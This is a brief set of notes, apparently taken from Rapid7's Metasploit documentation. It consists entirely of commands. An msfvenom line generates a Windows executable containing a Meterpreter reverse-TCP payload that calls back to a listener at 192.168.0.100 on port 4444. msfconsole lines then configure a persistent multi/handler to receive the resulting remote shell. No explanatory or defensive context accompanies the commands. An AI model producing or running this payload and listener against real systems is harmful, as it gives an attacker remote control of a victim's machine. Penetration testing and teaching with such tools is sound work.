https://docs.rapid7.com/metasploit/use-meterpreter-locally-without-an-exploit/  

> msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 --format=exe > mtr_payload.exe  

> msf> use exploit/multi/handler  

> msf> set payload windows/meterpreter/reverse_tcp  
> msf> set lhost eth0  
> msf> set lport 4444  
> msf> set ExitOnSession false  
> msf> exploit -j  

---

